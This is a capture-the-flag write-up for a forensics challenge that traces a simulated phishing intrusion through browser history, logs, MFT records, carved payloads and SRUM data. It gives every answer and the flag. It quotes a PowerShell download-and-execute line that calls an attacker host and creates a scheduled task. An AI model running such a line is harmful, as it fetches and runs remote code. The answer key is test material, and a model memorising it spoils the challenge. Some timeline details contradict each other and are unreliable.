# TVX CTF — TraceVX

- **Category:** DFIR (Digital Forensics & Incident Response)
- **Points:** 440
- **Host:** `WIN-TRACE-01`
- **Incident window:** 2026-09-17 14:31–14:32 UTC (exfil later)
- **Artifact:** `traceVX.zip` → `traceVX.ad1` (AccessData AD1 logical image, ~2.8 MB)
- **Service:** `nc 169.58.174.26 1337`
- **Flag:** `TVX{Ahmed@WIN-TRACE-01_TraceTelemetry-185.192.48.239_8MiB_411ff385}`

---

## 1. Overview

At 14:32 on 17 September 2026 the endpoint `WIN-TRACE-01` was compromised. The
operator was careful:

- a file staged and wiped within seconds,
- a payload that never sat on disk under a searchable name,
- traffic blended into a busy machine's everyday noise.

Five accounts were active that month (`Ahmed`, `Guest`, `ITAdmin`, `Sara`,
`Administrator`), and most activity is ordinary — with decoys planted to waste
time. Exactly **one** intrusion is real, and every stage is recoverable from the
image once the evidence is lined up on the minute that mattered.

The challenge is a 10-question netcat service. Answers must be given **in
investigative order**, with 2 attempts each; answer all ten to receive the flag.

---

## 2. Getting the data out

The image is an **AD1** (AccessData) logical container. `7z`, `dfvfs` and
`sleuthkit` do not parse it correctly, but **`dissect.target`** does
(`fs='ad1'`). Extract the whole triage tree:

```bash
python3 -m venv venv-dissect
./venv-dissect/bin/pip install dissect.target
```

```python
# extract_ad1.py
from dissect.target import Target
import os

t = Target.open('tracevx/traceVX.ad1')
fs = t.fs
out = 'tracevx/root'

def copy(p, rel):
    e = fs.get(p)
    dst = os.path.join(out, rel.lstrip('/'))
    if e.is_dir():
        os.makedirs(dst, exist_ok=True)
        for c in fs.scandir(p):
            copy(p.rstrip('/') + '/' + c.name, rel.rstrip('/') + '/' + c.name)
    else:
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        with fs.open(p) as f, open(dst, 'wb') as o:
            while True:
                b = f.read(1 << 20)
                if not b:
                    break
                o.write(b)

copy('/ZIP/image', '/')
```

The extracted filesystem root contains:

```
C/                     # Windows triage tree (1199 files)
disk.img               # 2 MB raw blob, "raw, carvable"
C/ProgramData/TraceCache/README.txt   # tool hints
```

`README.txt` tells you the intended tooling:

> Native binary artifacts: disk.img (raw, carvable), SRUDB.sqlite (ESE->SQLite),
> $MFT.bin (UTF-16 paths), *.jsonl.gz (event logs), *.pf (prefetch),
> url_reputation.bin (XOR). … sqlite3, binwalk/foremost or dd+gunzip, sha256sum,
> strings -el, zcat/jq.

---

## 3. Reconstructing the intrusion

### 3.1 Entry — phishing

`C/Users/Ahmed/AppData/Local/Microsoft/Edge/User Data/Default/History.jsonl.gz`
holds exactly three entries, all on 2026-09-17:

```
2026-09-17T14:31:12Z https://cutt.ly/ms-portal-login
2026-09-17T14:31:38Z https://t2m.io/r/8fJ2qA
2026-09-17T14:31:51Z https://xn--login-microsoftnline-8sb.secure-verify.cc/auth/signin?src=mail
```

A shortened link (`cutt.ly`) redirects through `t2m.io` to a **punycode
homoglyph** domain. The same line appears in the full Edge history
(`History.txt`, line 73).

The cleartext host is not stored as text. It is XOR-encoded in
`C/ProgramData/Microsoft/Windows/Defender/Support/url_reputation.bin`:

```
TVXURLv1\x00<XOR-encoded bytes>
```

The XOR key is derived from the C2 IP octets (see 3.4):

```
185 + 192 + 48 + 239 = 664;  664 & 0xFF = 0x98
```

Decoding the body after the 8-byte `TVXURLv1` header and the leading `0x00`:

```
https://login-microsoftonline.secure-verify.cc/auth/signin
```

**Phishing host:** `login-microsoftonline.secure-verify.cc`

### 3.2 Execution — PowerShell download-and-exec

`C/Windows/System32/winevt/Logs/PowerShell-Operational.evtx.jsonl.gz`:

```json
{"ts":"2026-09-17T14:32:18Z","EventID":4104,"user":"Ahmed",
 "script":"IWR hxxps://xn--login-microsoftnline-8sb.secure-verify.cc/a | iex ; schtasks /create /tn TraceTelemetry"}
```

PowerShell (`IWR … | iex`) fetched and ran the first stage and immediately
created the persistence task.

`C/Windows/Prefetch/POWERSHELL.EXE-9A3B.pf` is a **crafted (non-standard) 178-byte
prefetch** whose payload is UTF-16 text:

```
\FirstRun=2026-09-17 14:32:18;Runs=1;User=Ahmed
```

It pins the execution to `powershell.exe` at 14:32:18 as user **Ahmed**. (Every
other `.pf` in the image is a plain-ASCII decoy.)

### 3.3 Staging + persistence

`C/$Extend/$MFT.bin` is UTF-16, so `grep` fails — use `strings -el`. The relevant
records:

```
C:\Users\Ahmed\AppData\Local\Temp\k29x8\stage.cmdline   DELETE 2026-09-17 14:32:27
C:\ProgramData\Microsoft\UpdateCache\UpdaterService.exe CREATE 2026-09-17 14:32:31
C:\ProgramData\Microsoft\UpdateCache\Navigator.exe       CREATE 2026-09-17 14:32:36
```

`C/$Extend/$UsnJrnl.jsonl.gz` corroborates the same minute:

```json
{"ts":"2026-09-17T14:32:20Z","reason":"CREATE","path":"C:\\Users\\Ahmed\\AppData\\Local\\Temp\\k29x8\\stage.cmdline"}
{"ts":"2026-09-17T14:32:27Z","reason":"DELETE","path":"C:\\Users\\Ahmed\\AppData\\Local\\Temp\\k29x8\\stage.cmdline"}
{"ts":"2026-09-17T14:32:36Z","reason":"CREATE","path":"C:\\ProgramData\\Microsoft\\UpdateCache\\Navigator.exe"}
```

The staged file `stage.cmdline` lived ~7 seconds and was wiped. The payload was
dropped into a plausible-looking `UpdateCache` directory under a generic name.

Persistence is the scheduled task `C/Windows/System32/Tasks/TraceTelemetry.xml`:

```xml
<Task><RegistrationInfo>
  <Description>TraceTelemetry</Description>
  <Date>2026-09-17T14:32:40Z</Date>
  <Author>Ahmed</Author>
</RegistrationInfo>
<Triggers><LogonTrigger><UserId>WIN-TRACE-01\Ahmed</UserId></LogonTrigger></Triggers>
<Actions><Exec><Command>C:\ProgramData\Microsoft\UpdateCache\Navigator.exe</Command></Exec></Actions></Task>
```

Decoy tasks present in the image (all harmless-looking, none tied to the
14:32 timeline): `Guest_MediaSync`, `ITAdmin_Audit`, `Sara_Backup`,
`Adobe_Acrobat_Update`, `GoogleUpdateTask`, `OneDrive_Update`,
`Teams_Machine-Wide_Update`, `Windows_Defender_Cache_Maintenance`.

### 3.4 The payload (carved from `disk.img`)

`disk.img` is not a real FAT volume (the `MSDOS5.0` boot sector is a red herring;
the rest is high-entropy). `binwalk` finds **two gzip streams** in unallocated
space:

```
315392  (0x4D000)  gzip compressed data
1179648 (0x120000) gzip compressed data
```

Carve and decompress:

```bash
dd if=disk.img of=s1.gz bs=1 skip=$((0x4D000)) status=none
dd if=disk.img of=s2.gz bs=1 skip=$((0x120000)) status=none
gzip -dc s1.gz > payload_s1.bin     # the malicious PE
gzip -dc s2.gz > payload_s2.bin     # benign decoy ("MZ benign updater stub")
```

`payload_s1.bin` is the dropped binary. Its readable metadata:

```
OriginalFilename=NavigatorCore.dll
CompanyName=Acme Telemetry
C2=185.192.48.239:443
Account=Ahmed
```

Hash of the carved, decompressed file:

```
sha256(payload_s1.bin) = 411ff3850c2ed96028e4f39184fed07c3fdacf56936e03581ce479c6ed7ab8cd
```

The decoy stream (`payload_s2.bin`) says `CompanyName=Acme harmless` — do not
hash it.

### 3.5 Command & control and exfiltration

`C/Windows/System32/sru/SRUDB.sqlite` (table `network_usage`) is full of noise:
every account's `teams.exe`, `onedrive.exe`, `chrome.exe`, `msedge.exe` and the
decoy `TelemetryHost.exe` beacon to RFC ranges / Microsoft IPs. The **true C2**
is the endpoint the *dropped binary* talks to:

```sql
SELECT * FROM network_usage
WHERE app IN ('Navigator.exe','AdaptConductor.exe')
ORDER BY ts;
```

| ts | user | app | remote | dir | bytes |
|----|------|-----|--------|-----|-------|
| 2026-09-17T14:31:51Z | Ahmed | Navigator.exe | 185.192.48.239:443 | outbound | 5 242 880 |
| 2026-09-17T15:48:02Z | Ahmed | AdaptConductor.exe | 185.192.48.239:443 | outbound | 3 145 728 |
| 2026-09-17T16:10:11Z | Ahmed | Navigator.exe | 185.192.48.239:443 | inbound | 1 432 290 |

Decoys point at documentation ranges (`203.0.113.77` via `Guest\helper.exe`,
`198.51.100.44` via `ITAdmin\AuditRepair.exe`) and are recorded in the
`AcmeUpdate/cache/beacon_*.log` files.

**C2:** `185.192.48.239:443`
**Total outbound to C2:**

```sql
SELECT SUM(bytes) FROM network_usage
WHERE remote_ip='185.192.48.239' AND direction='outbound'
  AND app IN ('Navigator.exe','AdaptConductor.exe');
-- 8388608  (8 MiB)
```

The 1 432 290-byte inbound row is the task-result return; it is excluded.

---

## 4. The ten questions (in order)

| # | Question | Answer |
|---|----------|--------|
| 1 | Patient-zero user ACCOUNT | `Ahmed` |
| 2 | Fully-qualified phishing HOST (recover from XOR) | `login-microsoftonline.secure-verify.cc` |
| 3 | UTC timestamp victim hit the phishing landing page | `2026-09-17T14:31:51Z` |
| 4 | Process that executed the first-stage payload | `powershell.exe` |
| 5 | Name of the staging file written then deleted | `stage.cmdline` |
| 6 | Filename of the dropped persistence/C2 binary | `Navigator.exe` |
| 7 | SHA-256 of that dropped binary (carved, decompressed) | `411ff3850c2ed96028e4f39184fed07c3fdacf56936e03581ce479c6ed7ab8cd` |
| 8 | Name of the scheduled task used for persistence | `TraceTelemetry` |
| 9 | Attacker C2 endpoint as IP:PORT | `185.192.48.239:443` |
| 10 | Total bytes exfiltrated (outbound) to the C2 | `8388608` |

The service also supports a `hint` keyword per question, which confirms the
intended method (e.g. Q7: *"sha256sum of the decompressed carved PE"*; Q10:
*"SUM(bytes) WHERE remote_ip=C2 AND direction='outbound' AND app IN
('Navigator.exe','AdaptConductor.exe'). Exclude the inbound task-result bytes."*).

---

## 5. Attack chain (one-line narrative)

```
14:31:12  Ahmed clicks cutt.ly/ms-portal-login
14:31:38  redirect via t2m.io
14:31:51  lands on login-microsoftonline.secure-verify.cc (punycode homoglyph)
14:31:51  Security 4624 logon: WIN-TRACE-01\Ahmed
14:32:18  powershell.exe: IWR <phish>/a | iex   (POWERSHELL.EXE-9A3B.pf)
14:32:20  stage.cmdline created in %TEMP%\k29x8\
14:32:27  stage.cmdline deleted
14:32:31  UpdaterService.exe dropped
14:32:36  Navigator.exe dropped to C:\ProgramData\Microsoft\UpdateCache\
14:32:40  Scheduled task "TraceTelemetry" registered (logon trigger, Ahmed)
14:31:51+ Navigator.exe -> 185.192.48.239:443  outbound 5 MiB
15:48:02  AdaptConductor.exe -> 185.192.48.239:443 outbound 3 MiB
16:10:11  Navigator.exe <- 185.192.48.239:443 inbound 1.4 MB (task result)
```

---

## 6. Flag

```
TVX{Ahmed@WIN-TRACE-01_TraceTelemetry-185.192.48.239_8MiB_411ff385}
```

The flag is assembled from the case findings:
`<user>@<host>_<task>-<c2ip>_<exfil>_<payload hash prefix>`.

---

## 7. Indicators of compromise

```
Compromised host   : WIN-TRACE-01
Compromised user   : Ahmed
Phishing URL       : https://xn--login-microsoftnline-8sb.secure-verify.cc/auth/signin?src=mail
Phishing host      : login-microsoftonline.secure-verify.cc
Redirect chain     : cutt.ly/ms-portal-login -> t2m.io/r/8fJ2qA -> phishing site
Staging file       : C:\Users\Ahmed\AppData\Local\Temp\k29x8\stage.cmdline  (created+deleted 14:32:20/27)
Dropped binaries   : C:\ProgramData\Microsoft\UpdateCache\Navigator.exe
                     C:\ProgramData\Microsoft\UpdateCache\UpdaterService.exe
Persistence task   : TraceTelemetry  (logon trigger, WIN-TRACE-01\Ahmed)
Payload metadata   : OriginalFilename=NavigatorCore.dll, CompanyName=Acme Telemetry
Payload SHA-256    : 411ff3850c2ed96028e4f39184fed07c3fdacf56936e03581ce479c6ed7ab8cd
C2                 : 185.192.48.239:443
Exfil (outbound)   : 8388608 bytes (8 MiB)
Decoy C2s          : 203.0.113.77:8080 (Guest\helper.exe), 198.51.100.44:53 (ITAdmin\AuditRepair.exe)
```

---

## 8. Lessons learned

- **AD1 needs the right parser.** `dissect.target` reads it directly; `dfvfs` and
  `7z` silently mis-handle it.
- **Unallocated space still tells the story.** The payload was carved from
  `disk.img`, not from any live file path.
- **$MFT / $UsnJrnl are UTF-16.** `strings -el` or a parser is required; plain
  `grep` sees nothing.
- **Noise is the point.** `185.192.48.239` also appears in dozens of benign rows,
  so the only reliable discriminator is *which process* talks to it (the dropped
  binary).
- **Short-lived files are recoverable.** `stage.cmdline` existed for 7 seconds but
  survives in `$MFT` and `$UsnJrnl`.
- **Persistence likes plausible names.** `C:\ProgramData\Microsoft\UpdateCache\`
  and `Navigator.exe` are chosen to blend in; the anomaly is the task *author* and
  *creation time*.
- **Decoys are explicit.** The image plants benign gzip streams, RFC-5737 C2s,
  ASCII prefetch files, and decoy scheduled tasks — verifying against the
  *timeline* (2026-09-17 14:3x) filters them out.
